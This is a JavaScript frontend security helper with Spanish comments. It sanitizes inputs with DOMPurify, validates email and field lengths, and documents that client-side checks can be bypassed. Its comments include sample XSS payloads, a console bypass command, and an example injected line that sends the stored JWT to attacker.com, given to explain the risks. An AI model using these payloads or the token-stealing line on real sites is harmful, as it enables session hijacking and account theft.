/**
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║           UTILIDAD DE SEGURIDAD — XSS SANITIZATION              ║
 * ║                                                                  ║
 * ║  PRUEBA XSS: Esta función elimina scripts maliciosos de los      ║
 * ║  inputs antes de enviarlos al backend.                           ║
 * ║                                                                  ║
 * ║  Ejemplo de ataque prevenido:                                    ║
 * ║    Input: <script>document.cookie</script>                       ║
 * ║    Output: "" (cadena vacía, script eliminado)                   ║
 * ║                                                                  ║
 * ║    Input: <img src=x onerror="alert('XSS')">                    ║
 * ║    Output: <img src="x"> (evento malicioso eliminado)            ║
 * ╚══════════════════════════════════════════════════════════════════╝
 */
import DOMPurify from 'dompurify'

/**
 * Sanitiza una cadena de texto eliminando cualquier HTML/JS malicioso.
 * Previene ataques de Cross-Site Scripting (XSS).
 * @param {string} value - Valor a sanitizar
 * @returns {string} - Valor limpio y seguro
 */
export function sanitize(value) {
  if (typeof value !== 'string') return value
  // ALLOWED_TAGS: [] y ALLOWED_ATTR: [] eliminan TODOS los tags HTML
  // Esto convierte cualquier script en texto plano inofensivo
  return DOMPurify.sanitize(value, { ALLOWED_TAGS: [], ALLOWED_ATTR: [] })
}

/**
 * Sanitiza todos los campos de texto en un objeto (body de formulario).
 * @param {object} data - Objeto con los campos del formulario
 * @returns {object} - Objeto con todos los strings sanitizados
 */
export function sanitizeObject(data) {
  const clean = {}
  for (const key in data) {
    clean[key] = typeof data[key] === 'string' ? sanitize(data[key]) : data[key]
  }
  return clean
}

/**
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║        VALIDACIONES DEL LADO DEL CLIENTE (PRIMER FILTRO)        ║
 * ║                                                                  ║
 * ║  NOTA DE SEGURIDAD — "Desmitificar la Seguridad del FrontEnd":  ║
 * ║  Estas validaciones pueden bypassearse desde F12 > Console:      ║
 * ║                                                                  ║
 * ║  Ejemplo de bypass:                                              ║
 * ║  document.querySelector('input[maxlength]').removeAttribute      ║
 * ║    ('maxlength')                                                 ║
 * ║                                                                  ║
 * ║  Por eso el BACKEND también valida independientemente.           ║
 * ║  El frontend es solo el primer filtro (comodidad del usuario),   ║
 * ║  NUNCA la última línea de defensa.                               ║
 * ╚══════════════════════════════════════════════════════════════════╝
 */

/** Longitudes máximas de campo (deben coincidir con validaciones del backend) */
export const FIELD_LIMITS = {
  nombre: 100,
  categoria: 50,
  estado: 20,
  comentarios: 500,
  eventName: 200,
  email: 254,
  password: 128,
}

/**
 * Valida formato de email con regex estricto.
 * @param {string} email
 * @returns {boolean}
 */
export function isValidEmail(email) {
  // Regex basado en RFC 5322
  const emailRegex =
    /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/
  return emailRegex.test(email)
}

/**
 * Valida que un campo no supere la longitud máxima definida.
 * @param {string} value
 * @param {string} fieldName - nombre del campo en FIELD_LIMITS
 * @returns {string|null} - mensaje de error o null si es válido
 */
export function validateLength(value, fieldName) {
  const max = FIELD_LIMITS[fieldName]
  if (!max) return null
  if (value && value.length > max) {
    return `El campo no puede superar ${max} caracteres (actual: ${value.length})`
  }
  return null
}

/**
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║         SEGURIDAD DEL ALMACENAMIENTO LOCAL (localStorage)       ║
 * ║                                                                  ║
 * ║  ⚠️  VULNERABILIDAD CONOCIDA Y DOCUMENTADA:                     ║
 * ║                                                                  ║
 * ║  El token JWT se guarda en localStorage ('mg_token').           ║
 * ║  localStorage ES ACCESIBLE por JavaScript, lo que significa     ║
 * ║  que un ataque XSS exitoso podría robar el token así:           ║
 * ║                                                                  ║
 * ║  // Código malicioso que un XSS podría inyectar:                ║
 * ║  fetch('https://attacker.com/steal?token=' +                    ║
 * ║    localStorage.getItem('mg_token'))                            ║
 * ║                                                                  ║
 * ║  ALTERNATIVA SEGURA: Cookies HttpOnly                           ║
 * ║  Las cookies con HttpOnly NO son accesibles por JavaScript,     ║
 * ║  eliminando este vector de ataque.                              ║
 * ║                                                                  ║
 * ║  MITIGACIÓN IMPLEMENTADA:                                       ║
 * ║  - Sanitización XSS en todos los inputs (DOMPurify)            ║
 * ║  - El token tiene expiración corta (definida en el backend)     ║
 * ║  - CSP en el backend limita los scripts externos               ║
 * ╚══════════════════════════════════════════════════════════════════╝
 */
